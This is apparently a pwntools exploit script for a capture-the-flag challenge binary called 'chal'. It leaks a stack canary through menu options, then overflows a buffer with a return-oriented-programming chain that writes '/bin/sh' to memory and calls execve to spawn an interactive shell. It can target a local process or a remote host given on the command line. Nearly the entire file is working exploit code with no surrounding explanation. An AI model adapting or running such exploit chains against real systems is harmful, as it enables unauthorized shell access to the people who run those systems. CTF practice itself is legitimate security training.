from pwn import *
import sys

context.log_level = "debug"
context.terminal = ["wt.exe", "wsl.exe"]
context.arch = "amd64"

exe = context.binary = ELF("./chal")

if len(sys.argv) == 1:
    r = process("./chal")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)


r.sendlineafter(b'> ', b'Darling in the FRANXX')

r.sendlineafter(b'> ', b'15')
upper = r.recvline().decode().split()[1]
r.sendlineafter(b'> ', b'14')
lower = r.recvline().decode().split()[1]

canary = int(upper+lower, 16)
success(f"canary: {hex(canary)}")

"""
rax = 0x3b
rdi = /bin/sh\x00
rsi = 0
rdx = 0

0x0000000000434bbb : pop rax ; ret
0x0000000000433f95 : mov qword ptr [rsi], rax ; ret
0x000000000041fcf5 : pop rsi ; ret
0x00000000004571e7 : pop rbx ; ret
0x0000000000494253 : pop rdi ; ret
0x0000000000432f5b : mov rdx, rbx ; syscall
"""
pop_rax = 0x434bbb
mov_rsi_rax = 0x433f95
pop_rsi = 0x41fcf5
pop_rbx = 0x4571e7
mov_rdx_rbx = 0x432f5b
pop_rdi = 0x494253

rop = b''
rop += b'a'*56
rop += p64(canary)
rop += p64(0)
rop += p64(pop_rax)
rop += b'/bin/sh\x00'
rop += p64(pop_rsi)
rop += p64(0x4cccc0)  # somewhere writable
rop += p64(mov_rsi_rax)  # set /bin/sh
rop += p64(pop_rbx)
rop += p64(0)
rop += p64(pop_rax)  # set rax
rop += p64(0x3b)
rop += p64(pop_rdi)  # set rdi
rop += p64(0x4cccc0)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(mov_rdx_rbx)  # set rdx

r.sendlineafter(b'> ', rop)

r.interactive()
